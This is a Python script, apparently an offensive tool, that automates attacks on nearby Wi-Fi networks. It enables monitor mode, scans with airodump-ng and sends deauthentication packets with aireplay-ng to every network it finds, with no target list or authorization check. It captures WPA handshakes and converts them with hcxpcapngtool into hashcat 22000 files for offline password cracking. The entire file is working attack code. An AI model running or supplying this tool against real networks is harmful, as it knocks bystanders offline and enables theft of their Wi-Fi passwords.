#!/usr/bin/env python3
import subprocess
import argparse
import time
import sys
import signal
import datetime
import csv
import os
import re

DEBUG = False

class WiFiHandshakeCapture:
    def __init__(self, interface):
        self.interface = interface
        self.mon_interface = ""
        self.output_file = "scanOutput"
        self.output_dir = "outputs"
        self.capture_dir = "handshakes"
        self.hashcat_22000_dir = "hashcat_22000"
        self.processes = []
        
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(self.capture_dir, exist_ok=True)
        os.makedirs(self.hashcat_22000_dir, exist_ok=True)
        
        signal.signal(signal.SIGINT, self.signal_handler)

    def enable_monitor_mode(self):
        """Put the Wi-Fi interface into monitor mode with cleanup"""
        try:
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
            result = subprocess.run(
                ["sudo", "airmon-ng", "start", self.interface],
                stdout=subprocess.PIPE,
                check=True
            )
            
            pattern = r'on \[phy\d+\](\w+)'
            output = result.stdout.decode('utf-8')
            match = re.search(pattern, output)
            if match:
                self.mon_interface = match.group(1)
            else:
                self.mon_interface = "wlan0mon"
                print("WARNING: Using default monitor interface wlan0mon")
            
            print(f"[*] Monitor mode enabled on {self.mon_interface}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"Error enabling monitor mode: {e}")
            self.cleanup()
            return False

    def run_in_terminal(self, command, title=""):
        """Run command in a new xterm window"""
        try:
            proc = subprocess.Popen([
                "xterm",
                "-title", title,
                "-e", f"{command}; echo 'Press ENTER to close...'"
            ])
            self.processes.append(proc)
            return True
        except Exception as e:
            print(f"Error starting terminal: {e}")
            return False

    def parse_airodump_csv(self):
        networks = []
        try:
            file_name = f"{self.output_dir}/{self.output_file}-01.csv"
            with open(file_name, mode='r', newline='') as file:
                reader = csv.reader(file)
                for row in reader:
                    if len(row) > 0 and row[0].strip() == "BSSID":
                        break
                for row in reader:
                    if len(row) < 14:
                        continue
                    if row[0].strip() == "Station MAC":
                        break
                    bssid = row[0].strip()
                    channel = row[3].strip()
                    essid = row[13].strip()
                    networks.append((bssid, channel, essid))
        except Exception as e:
            print(f"Error parsing CSV file: {e}")
        return networks

    def scan_networks(self):
        """Scan for nearby networks using airodump-ng"""
        try:
            # Start scanning process
            self.run_in_terminal(
                f"sudo airodump-ng -w {self.output_dir}/{self.output_file} --output-format csv {self.mon_interface}",
                "WiFi Scanner"
            )
            
            print("Scanning for networks for 30 seconds...")
            time.sleep(30)
            
            # Stop scanning by killing the process
            for proc in self.processes:
                if "airodump-ng" in ' '.join(proc.args):
                    proc.terminate()
            
            return self.parse_airodump_csv()

        except Exception as e:
            print(f"Scan error: {e}")
            return []

    def capture_handshake(self, bssid, name, channel):
        """Capture handshake for a specific network"""
        print(f"Capturing handshake for {name} ({bssid})")
        bssid_no_dots = bssid.replace(":", "")
        output_file = f"handshake_{bssid_no_dots}"
        cap_path = f"{self.output_dir}/{output_file}"

        airodump_proc = None
        aireplay_proc = None

        try:
            # Start capture process
            airodump_cmd = (
                f"sudo airodump-ng -c {channel} --bssid {bssid} "
                f"-w {cap_path} --output-format pcap {self.mon_interface}"
            )
            airodump_proc = subprocess.Popen(
                ["xterm", "-title", f"Capture: {name}", "-e", airodump_cmd]
            )
            self.processes.append(airodump_proc)

            # Start deauth attack
            aireplay_cmd = f"sudo aireplay-ng -D -0 12 -a {bssid} {self.mon_interface}"
            aireplay_proc = subprocess.Popen(
                ["xterm", "-title", f"Deauth: {name}", "-e", aireplay_cmd]
            )
            self.processes.append(aireplay_proc)

            # Handshake detection logic
            start_time = time.time()
            handshake_found = False
            cap_file = f"{cap_path}-01.cap"
            timeout = 30  # Total timeout in seconds

            while time.time() - start_time < timeout:
                if os.path.exists(cap_file):
                    result = subprocess.run(
                        ["aircrack-ng", cap_file],
                        stdout=subprocess.PIPE,
                        text=True
                    )
                    if "1 handshake" in result.stdout:
                        handshake_found = True
                        break
                time.sleep(0.5)

            if handshake_found:
                os.system(f"sudo cp {cap_file} {self.capture_dir}/{output_file}.cap")
                os.system(
                    f"sudo hcxpcapngtool -o {self.hashcat_22000_dir}/"
                    f"{name}_{bssid_no_dots}.22000 {cap_file}"
                )
                return True
            return False

        finally:
            # Cleanup processes
            if airodump_proc:
                airodump_proc.terminate()
            if aireplay_proc:
                aireplay_proc.terminate()
            time.sleep(1)  # Allow time for processes to terminate

    def signal_handler(self, sig, frame):
        """Handle CTRL+C gracefully"""
        print("\n[!] Interrupt received, cleaning up...")
        self.cleanup()
        sys.exit(0)

    def cleanup(self):
        """Restore network configuration and clean up processes"""
        print("[*] Cleaning up...")
        try:
            # Terminate all spawned processes
            for proc in self.processes:
                try:
                    proc.terminate()
                except Exception as e:
                    print(f"Error terminating process {proc.pid}: {e}")

            # Stop monitor mode
            subprocess.run(
                ["sudo", "airmon-ng", "stop", self.mon_interface],
                stderr=subprocess.DEVNULL
            )
            
            # Restore network services
            subprocess.run(["sudo", "service", "NetworkManager", "start"], check=True)
            subprocess.run(["sudo", "ifconfig", self.interface, "up"], check=True)
            
            # Clean output files
            os.system(f"sudo rm -f {self.output_dir}/*")

        except Exception as e:
            print(f"Cleanup error: {e}")

    def run(self):
        """Main execution flow"""
        if not self.enable_monitor_mode():
            return
        
        captured_targets = []
        try:
            while True:
                networks = self.scan_networks()
                if not networks:
                    print("No networks found. Retrying in 10 seconds...")
                    time.sleep(10)
                    continue

                for bssid, channel, essid in networks:
                    if essid in captured_targets:
                        continue

                    # Check existing captures
                    bssid_no_dots = bssid.replace(":", "")
                    if any(bssid_no_dots in f for f in os.listdir(self.capture_dir)):
                        print(f"Skipping {essid} - already captured")
                        captured_targets.append(essid)
                        continue

                    print(f"\nAttempting capture for: {essid}")
                    if self.capture_handshake(bssid, essid, channel):
                        print(f"Successfully captured handshake for {essid}")
                        captured_targets.append(essid)
                    else:
                        print(f"Failed to capture handshake for {essid}")

                print("\nCompleted scan cycle. Restarting in 10 seconds...")
                time.sleep(10)

        except KeyboardInterrupt:
            self.cleanup()
        finally:
            self.cleanup()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="WiFi Handshake Capture Tool - Captures WPA handshakes for nearby networks",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument(
        "-i", "--interface",
        required=True,
        help="Wireless interface name (e.g. wlan0)"
    )
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("This script requires root privileges. Please run with sudo.")
        sys.exit(1)

    capture = WiFiHandshakeCapture(args.interface)
    capture.run()
